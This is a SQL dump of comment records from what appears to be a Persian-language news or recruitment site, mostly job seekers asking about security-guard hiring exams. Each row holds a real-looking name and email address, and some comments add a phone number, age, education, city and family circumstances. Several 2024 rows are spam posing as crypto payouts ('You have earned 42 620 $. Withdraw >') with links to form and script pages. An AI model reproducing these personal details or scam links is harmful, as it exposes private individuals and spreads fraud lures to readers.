INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84688, 54193, 'عادل باوی فرد', 'aadelbavii@gmail.com', 'سلام من جوز حفاظتی ومراقبتی ایمن صادق سپاهان', 0, '2023-01-28 11:31:16', '1401/11/8', '11:31:16 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84689, 54193, 'ساجد چلداوی ', 'sajadahmadi4556@gmail.com', 'نیاز به کار 

', 0, '2023-01-28 14:01:25', '1401/11/8', '2:01:25 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84690, 54193, 'ساجد چلداوی ', 'sajadahmadi4556@gmail.com', 'نیاز به کار 

', 0, '2023-01-28 14:01:27', '1401/11/8', '2:01:27 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84691, 54193, 'ساجد چلداوی ', 'sajadahmadi4556@gmail.com', 'نیاز به کار 

', 0, '2023-01-28 14:01:30', '1401/11/8', '2:01:30 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84692, 54193, 'ساجد چلداوی ', 'sajadahmadi4556@gmail.com', 'نیاز به کار 

', 0, '2023-01-28 14:01:32', '1401/11/8', '2:01:32 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84693, 54193, 'ساجد چلداوی ', 'sajadahmadi4556@gmail.com', 'نیاز به کار 

', 0, '2023-01-28 14:01:35', '1401/11/8', '2:01:35 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84694, 54193, 'ساجد چلداوی ', 'sajadahmadi4556@gmail.com', 'نیاز به کار 

', 0, '2023-01-28 14:01:38', '1401/11/8', '2:01:38 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84695, 54193, 'جباردریس', 'jbarzyz090@gmail.com', 'نگهبان', 0, '2023-01-28 16:01:41', '1401/11/8', '4:01:41 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84696, 54193, 'omid', 'omidvarnaseri1980@gmail.com', 'سلام آزمون استخدامی نگهبانی', 0, '2023-01-28 23:32:37', '1401/11/8', '11:32:37 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84697, 53190, 'رضا', 'hadi.kayed1556@gmail.com', 'استخدام', 0, '2023-01-29 12:18:39', '1401/11/9', '12:18:39 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84698, 54193, 'محمد چهره پرداز', 'asemooneabim@yahoo.com', 'فوق دیپلم مکانیک 
تولد ۲۸/۱۲/۱۳۷۰', 0, '2023-01-29 19:56:34', '1401/11/9', '7:56:34 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84699, 54193, 'یوسف شرفی', 'ywsfshrfy3@gmail.com', 'سلام چطور میتوانم ثبت نام کنم', 0, '2023-01-29 22:24:53', '1401/11/9', '10:24:53 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84700, 54193, 'عبدالله', 'abdola.5996.com@gmail.com', 'A', 0, '2023-01-29 22:28:43', '1401/11/9', '10:28:43 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84701, 54193, 'عبدالله', 'abdola.5996.com@gmail.com', 'A', 0, '2023-01-29 22:28:45', '1401/11/9', '10:28:45 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84702, 51185, 'سیدعلی موسوی نور', 'anor@yahoo.com', 'Jsh', 0, '2023-01-29 22:45:14', '1401/11/9', '10:45:14 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84703, 51185, 'سیدعلی موسوی نور', 'anor@yahoo.com', 'Jsh', 0, '2023-01-29 22:45:17', '1401/11/9', '10:45:17 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84704, 54193, 'میثم ', 'meysamyazdani2019@gmail.com', 'نگهبان', 0, '2023-01-29 23:32:24', '1401/11/9', '11:32:24 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84705, 54193, 'میثم ', 'meysamyazdani2019@gmail.com', 'نگهبان', 0, '2023-01-30 00:19:39', '1401/11/10', '12:19:39 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84706, 54193, 'سید مصطفی موسوی ', 'mostfa.mosi1994@gmail.com', 'جهت ثبت نام ازمون ', 0, '2023-01-30 11:28:58', '1401/11/10', '11:28:58 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84707, 54193, 'آرش شیرمردی', 'arashshiri122@gmail.com', 'استخدام', 0, '2023-01-30 11:38:35', '1401/11/10', '11:38:35 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84708, 51185, 'seyed.mohammad', 'seyedmuhammad1993@gmail.com', 'بنده رشته ام برقه
فن ورز هم دارم
ایمنی در برق و توزیع نیرو برق شبکه های هوایی', 0, '2023-01-30 14:55:09', '1401/11/10', '2:55:09 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84709, 54193, 'امیر حسین سلامت مطرودی', 'amir.salamat2422@gmail.com', '2ua3y', 0, '2023-01-30 15:38:23', '1401/11/10', '3:38:23 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84710, 54193, 'عرفان', 'Sepehrfat@gmail.com', 'برای کار ', 0, '2023-01-30 17:31:50', '1401/11/10', '5:31:50 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84711, 54193, 'Seyed.mohammad', 'seyedmuhammad1993@gmail.com', 'سلام بنده مدرک کاردانی برق قدرته
فن ورز هم دارم
رعایت اینمی در شبکه های توزیع برق و فن ورز شبکه های هوایی ', 0, '2023-01-30 20:55:30', '1401/11/10', '8:55:30 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84712, 54193, 'عادل باوی فرد', 'aadelbavii@gmail.com', '۰۹۳۳۰۱۳۱۴۶۷ من جزه موسسه خمات حفاظتی ومراقبتی ایمن صادق سپاهان پست کوت امیر', 0, '2023-01-30 23:47:16', '1401/11/10', '11:47:16 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84713, 54193, 'احمد', 'Shimairancell1371@gmail.com', 'سلام', 0, '2023-01-31 00:43:48', '1401/11/11', '12:43:48 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84714, 54193, 'جاسم طرفی', 'torfijasm71@gmil.com', 'حراست ونگهداری از اماکن', 0, '2023-01-31 15:55:54', '1401/11/11', '3:55:54 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84715, 54193, 'امین شریفی ', 'sharamin369@gmail.com', 'استخدام حراست ', 0, '2023-01-31 17:37:51', '1401/11/11', '5:37:51 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84716, 54193, 'امین شریفی ', 'sharamin369@gmail.com', 'استخدام حراست ', 0, '2023-01-31 17:38:31', '1401/11/11', '5:38:31 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84717, 54193, 'امین شریفی ', 'sharamin369@gmail.com', 'استخدام حراست ', 0, '2023-01-31 17:38:34', '1401/11/11', '5:38:34 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84718, 54193, 'امین شریفی ', 'sharamin369@gmail.com', 'استخدام حراست ', 0, '2023-01-31 17:38:39', '1401/11/11', '5:38:39 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84719, 54193, 'امین شریفی ', 'sharamin369@gmail.com', 'سلام خسته نباشید 
امین شریفی  21سال. 
مدرک تحصیلی دیپلم، ورزشکار
ساکن اهواز 
', 0, '2023-01-31 17:42:43', '1401/11/11', '5:42:43 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84720, 53190, 'بهادرحدادی', 'bahadorhadadi1992@gmail.com', 'جهت ثبت نام', 0, '2023-02-01 00:41:18', '1401/11/12', '12:41:18 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84721, 54193, 'مرتضی ظاهری نسب', 'mortezazaheri72@gmail.com', 'دارای سابقه حراست ', 0, '2023-02-01 12:16:38', '1401/11/12', '12:16:38 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84722, 54193, 'رضامنشدی ', 'sanaabiyavi6@gmail.com', 'سلام خسته نباشید من همه شرایط دارم ولی متولد ۶۸ لطفا کنیدقبول کنید تا درازمون شرکت کنم باتشکر ', 0, '2023-02-01 14:20:55', '1401/11/12', '2:20:55 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84723, 54193, 'رضامنشدی ', 'sanaabiyavi6@gmail.com', 'شرکت کردن درازمون استخدامی', 0, '2023-02-01 14:39:52', '1401/11/12', '2:39:52 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84724, 54193, 'میثم یزدانی', 'meysamyazdani2019@gmail.com', 'نگهبان', 0, '2023-02-01 14:49:48', '1401/11/12', '2:49:48 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84725, 54193, 'محمدعلی قنواتی', 'www.mohamadali1376@gmail.com', 'سلام ', 0, '2023-02-01 21:40:18', '1401/11/12', '9:40:18 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84726, 54193, 'محمدعلی قنواتی', 'www.mohamadali1376@gmail.com', 'سلام ', 0, '2023-02-01 21:40:22', '1401/11/12', '9:40:22 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84727, 54193, 'Hadi', 'hadi.mg1994@gmail.com', 'سلام خدمت مجریه آزمون
منبع دروس عمومی چیه سردرگمیم ایا ازدروس دبیرستانه؟اطف کنید یه توضیح بدید تشکر', 0, '2023-02-01 23:02:31', '1401/11/12', '11:02:31 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84728, 54193, 'سجاد ممبینی ', 'S.mombeiny66@gmail.com', 'شرکت در آزمون ', 0, '2023-02-02 12:55:57', '1401/11/13', '12:55:57 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84729, 54193, 'جاسم طرفی', 'torfijasm71@gmil.com', 'بنده متاهل 
دارای ۳فرزند بیکار', 0, '2023-02-02 15:32:58', '1401/11/13', '3:32:58 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84730, 51185, 'سید صادق فاضلی ', 'Jdbdhhdvsh77@gmail.com', 'ثبت نام', 0, '2023-02-02 18:21:32', '1401/11/13', '6:21:32 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84731, 51185, 'عبدالقادر‌ثابتی', 'qhadrsabti@gmil.com', 'سلام‌دارای‌سوم‌دبیرستان‌وکارانامه‌فن‌وحرفه‌‌ساختمان‌‌مهندسب', 0, '2023-02-03 03:59:04', '1401/11/14', '3:59:04 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84732, 51185, 'عبدالقادر‌ثابتی', 'qhadrsabti@gmil.com', 'سلام‌دارای‌سوم‌دبیرستان‌وکارانامه‌فن‌وحرفه‌‌ساختمان‌‌مهندسب', 0, '2023-02-03 03:59:29', '1401/11/14', '3:59:29 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84733, 51185, 'عبدالقادر‌ثابتی', 'qhadrsabti@gmil.com', 'سلام‌دارای‌سوم‌دبیرستان‌وکارانامه‌فن‌وحرفه‌‌ساختمان‌‌مهندسب', 0, '2023-02-03 04:00:36', '1401/11/14', '4:00:36 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84734, 51185, 'عبدالقادر‌ثابتی', 'qhadrsabti@gmil.com', 'سلام‌دارای‌سوم‌دبیرستان‌وکارانامه‌فن‌وحرفه‌‌ساختمان‌‌مهندسب', 0, '2023-02-03 04:01:07', '1401/11/14', '4:01:07 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84735, 51185, 'عبدالقادر‌ثابتی', 'qhadrsabti@gmil.com', 'سلام‌دارای‌سوم‌دبیرستان‌وکارانامه‌فن‌وحرفه‌‌ساختمان‌‌مهندسب', 0, '2023-02-03 04:01:54', '1401/11/14', '4:01:54 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84736, 54193, 'نوید احمدی ', 'navid.ahmadi945@gmil.com', ' 25ساله', 0, '2023-02-03 14:54:46', '1401/11/14', '2:54:46 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84737, 54193, 'علی لویمی', 'Javadlovimi48@gmail.Com', 'استخدام', 0, '2023-02-05 00:48:54', '1401/11/16', '12:48:54 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84738, 54193, 'Mohammadali', 'darmymrjan@gmail.com', 'ثبت نام آزمون', 0, '2023-02-05 07:29:57', '1401/11/16', '7:29:57 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84739, 54193, 'سید محمدرضا ذهبی', 'seyedehebtesammoosavi@gmail.com', '5vq4h', 0, '2023-02-05 11:53:22', '1401/11/16', '11:53:22 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84740, 54193, 'میثم ', 'meysamyazdani2019@gmail.com', 'نگهبان', 0, '2023-02-05 12:55:04', '1401/11/16', '12:55:04 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84741, 54193, 'مهدی مراقی', 'Mehddddiiiii6@gmail.com', 'مهدی مراقی', 0, '2023-02-05 13:13:51', '1401/11/16', '1:13:51 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84742, 54193, 'کریم ', 'www.saed.karim.4984@gamil.com', 'ثبت نام', 0, '2023-02-06 17:51:47', '1401/11/17', '5:51:47 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84743, 54193, 'علیرضاعزیزی', 'aalireza971@gmail.com', 'استخدام نیرو

', 0, '2023-02-08 12:02:12', '1401/11/19', '12:02:12 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84744, 54193, 'آرمین نادری', 'Mahmoudhashempour38@gmail.com', 'برای خدمت به ایران
', 0, '2023-02-11 23:17:54', '1401/11/22', '11:17:54 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84745, 54193, 'hossin', 'salehihossin8@gmail.com', 'استخدام', 0, '2023-02-12 18:55:05', '1401/11/23', '6:55:05 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84746, 54200, 'رضا', 'hadi.kayed1556@gmail.com', 'استخدامی', 0, '2023-02-15 14:28:33', '1401/11/26', '2:28:33 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84747, 54200, 'اسحاق پایدار', 'eshaghp5@gmail.com', 'چرا سایت بالا نمیاد', 0, '2023-02-15 16:13:31', '1401/11/26', '4:13:31 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84748, 54200, 'محمد مهدی مرادی', 'Mehdi.m4770@gmail.com', 'جهت استخدام', 0, '2023-02-15 21:13:21', '1401/11/26', '9:13:21 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (85746, 54193, 'رضا', 'r.sharafi3979@gmil.cim', 'سلام و عرض ادب نتایج آزمون جذب نیروی حجمی نگهبان موسسه خدمات حفاظتی و مراقبتی حافظین امنیت پادنا کی اعلام میشه ', 0, '2023-02-19 08:50:30', '1401/11/30', '8:50:30 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (85747, 54200, 'محمد علی جلالیان لرکی', 'ali17401290p@gmail.cim', 'استخدام', 0, '2023-03-04 15:11:26', '1401/12/13', '3:11:26 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (85748, 54200, 'عبدالقادر‌ثابتی', 'qhadrsabti@gmil.com', 'سلام‌‌علیکم', 0, '2023-03-05 01:36:12', '1401/12/14', '1:36:12 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (85750, 54200, 'دانیال', 'danial.poormhrabi1999@gmail.com', 'استخدامی
', 0, '2023-03-05 18:47:05', '1401/12/14', '6:47:05 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (85752, 54200, 'علی لویمی', 'Javadlovimi48@gmail.Com', 'نتایج آزمون ', 0, '2023-03-07 15:58:55', '1401/12/16', '3:58:55 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (85753, 54200, 'علی ', 'Alisalahshoor1997@gmail.com', 'درخواست همکاری جهت سمت سیمبان', 0, '2023-03-10 21:22:08', '1401/12/19', '9:22:08 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (86746, 59225, '🔅 Mining 32 034 US dollars.  GЕТ >>> https://forms.yandex.com/cloud/65c5cc5d50569049b5e1d17f/?hs=2b', 'agedly@mailf5.us', 'h0w29l', 0, '2024-02-14 22:06:09', '1402/11/25', '10:06:09 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (86747, 59225, '🔅 Transaction 35 049 Dollars.  GЕТ > https://forms.yandex.com/cloud/65d1fb4fc769f17b8278e5ba/?hs=2b', 'amaki@couxpn.com', 'pvmp2v', 0, '2024-02-23 14:14:44', '1402/12/4', '2:14:44 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (86748, 59225, '✔ Yоu hаvе еаrnеd 13 985 USD.  Gо tо withdrаwаl >>> https://forms.yandex.com/cloud/65e6228102848f1a7', 'watcher2112@ecocryptolab.com', 'fir4oo', 0, '2024-03-05 17:23:33', '1402/12/15', '5:23:33 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (86749, 59226, '🔴 Yоu hаvе еаrnеd 42 620 $.  Withdrаw > https://forms.yandex.com/cloud/65e6228102848f1a71edd8c9?hs=', 'watcher2112@ecocryptolab.com', '5f36yb', 0, '2024-03-05 17:23:38', '1402/12/15', '5:23:38 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (86750, 51185, 'علا حزباوی', 'Faterfater7474@gmail.com', 'مهندس برق', 0, '2024-03-09 19:54:54', '1402/12/19', '7:54:54 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (86751, 51185, 'علا حزباوی', 'Faterfater7474@gmail.com', 'مهندس برق', 0, '2024-03-09 19:54:56', '1402/12/19', '7:54:56 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (86752, 51185, 'علا حزباوی', 'Faterfater7474@gmail.com', 'مهندس برق', 0, '2024-03-09 19:54:57', '1402/12/19', '7:54:57 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (86753, 51185, 'علا حزباوی', 'Faterfater7474@gmail.com', 'مهندس برق', 0, '2024-03-09 19:54:58', '1402/12/19', '7:54:58 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (86754, 51185, 'علا حزباوی', 'Faterfater7474@gmail.com', 'مهندس برق', 0, '2024-03-09 19:54:59', '1402/12/19', '7:54:59 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (86755, 59225, '✔ Withdrawing 53 886 Dollars.  Gо tо withdrаwаl > https://forms.yandex.com/cloud/65db119443f74fe420e', 'romnik2012@code-gmail.com', 'qn33a7', 0, '2024-03-10 17:26:57', '1402/12/20', '5:26:57 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (86756, 59226, '🟢 You got 48 986 Dollars.  GЕТ >>> https://forms.yandex.com/cloud/65db1181d04688e3db4b5bc9?hs=397dc', 'romnik2012@code-gmail.com', '5a5iz2', 0, '2024-03-10 17:27:01', '1402/12/20', '5:27:01 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (86757, 59226, '🔶 Transaction 44 384 USD.  Withdrаw >>> https://forms.yandex.com/cloud/65db1187c769f1e401949a17?hs=', 'mbfraser@timhoreads.com', 'dei8hx', 0, '2024-03-13 14:07:55', '1402/12/23', '2:07:55 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87757, 59230, 'جاسم ناصری', 'www.jaseemnaseri205@gmail.com', '1596', 0, '2024-03-17 20:09:27', '1402/12/27', '8:09:27 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87758, 59230, 'جاسم ناصری', 'www.jaseemnaseri205@gmail.com', '1596', 0, '2024-03-17 20:09:29', '1402/12/27', '8:09:29 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87759, 59230, 'جاسم ناصری', 'www.jaseemnaseri205@gmail.com', '1596', 0, '2024-03-17 20:09:30', '1402/12/27', '8:09:30 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87760, 59230, 'محمد م', 'mohamad.am727@yahoo.com', 'سلام وقت بخیر نتایج آزمون چه تاریخی اعلام میشه ؟', 0, '2024-03-19 11:52:51', '1402/12/29', '11:52:51 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87761, 59230, 'محمد م', 'mohamad.am727@yahoo.com', 'سلام وقت بخیر نتایج آزمون چه تاریخی اعلام میشه ؟', 0, '2024-03-19 11:52:56', '1402/12/29', '11:52:56 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87762, 59230, 'محمد م', 'mohamad.am727@yahoo.com', 'سلام وقت بخیر نتایج آزمون چه تاریخی اعلام میشه ؟', 0, '2024-03-19 11:52:58', '1402/12/29', '11:52:58 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87763, 59212, 'اقبال خورده بينان', 'ekhordabinan@gmail.com', 'به روز بودن اطلاعات و دست آوردها ی علمی ضروريست وجود مسئولین دلسوز هم ضروريست تا با برنامه ریزی توان علمی و تجربی کارکنان را افزایش دهند در مجموع این امر مثبت است ', 0, '2024-03-30 04:01:51', '1403/1/11', '4:01:51 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87764, 59212, 'اقبال خورده بينان', 'ekhordabinan@gmail.com', 'به روز بودن اطلاعات و دست آوردها ی علمی ضروريست وجود مسئولین دلسوز هم ضروريست تا با برنامه ریزی توان علمی و تجربی کارکنان را افزایش دهند در مجموع این امر مثبت است ', 0, '2024-03-30 04:01:54', '1403/1/11', '4:01:54 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87765, 59212, 'اقبال خورده بينان', 'ekhordabinan@gmail.com', 'به روز بودن اطلاعات و دست آوردها ی علمی ضروريست وجود مسئولین دلسوز هم ضروريست تا با برنامه ریزی توان علمی و تجربی کارکنان را افزایش دهند در مجموع این امر مثبت است ', 0, '2024-03-30 04:01:58', '1403/1/11', '4:01:58 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87766, 59212, 'اقبال خورده بينان', 'ekhordabinan@gmail.com', 'به روز بودن اطلاعات و دست آوردها ی علمی ضروريست وجود مسئولین دلسوز هم ضروريست تا با برنامه ریزی توان علمی و تجربی کارکنان را افزایش دهند در مجموع این امر مثبت است ', 0, '2024-03-30 04:02:00', '1403/1/11', '4:02:00 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87767, 59212, 'اقبال خورده بينان', 'ekhordabinan@gmail.com', 'به روز بودن اطلاعات و دست آوردها ی علمی ضروريست وجود مسئولین دلسوز هم ضروريست تا با برنامه ریزی توان علمی و تجربی کارکنان را افزایش دهند در مجموع این امر مثبت است ', 0, '2024-03-30 04:02:05', '1403/1/11', '4:02:05 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87768, 59230, 'صادق', 'sadeghasadi2002@gmail.com', 'سلام نتايج كي اعلام ميشود؟', 0, '2024-03-31 17:13:53', '1403/1/12', '5:13:53 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87769, 59227, '🔅 SЕNDING 0,75000 ВTC. Continue >>> https://telegra.ph/BTC-Transaction--184786-03-14?hs=b9fdbba1f1f', 'stevescan@24hinbox.com', 'sd0msj', 0, '2024-04-04 12:01:23', '1403/1/16', '12:01:23 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87770, 59230, '🔴 Transfer 67 035 $.  Gо tо withdrаwаl =>> https://telegra.ph/BTC-Transaction--804677-03-14?hs=8858', 'stevescan@24hinbox.com', '64hcaj', 0, '2024-04-04 12:02:02', '1403/1/16', '12:02:02 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87771, 59227, '🔶 TRАNSАСТIОN 1.0000597 ВTC. Continue > https://script.google.com/macros/s/AKfycbyyo3WRfWlgC1yKmi25', 'watcher2112@ecocryptolab.com', '2aahhe', 0, '2024-04-05 18:41:38', '1403/1/17', '6:41:38 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87772, 59230, '🔄 Transaction 45 531 $.  Gо tо withdrаwаl >> https://script.google.com/macros/s/AKfycbzTDiAvz8cTDDl', 'watcher2112@ecocryptolab.com', 'oz312i', 0, '2024-04-05 18:42:33', '1403/1/17', '6:42:33 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87773, 59230, '✅ ТRАNSFЕR 0,7576 ВTC. Next >> https://telegra.ph/BTC-Transaction--266928-03-14?hs=8858037a68bd51cd7', 'hatty2001@murahpanel.com', 'hhggqa', 0, '2024-04-06 18:30:58', '1403/1/18', '6:30:58 PM');
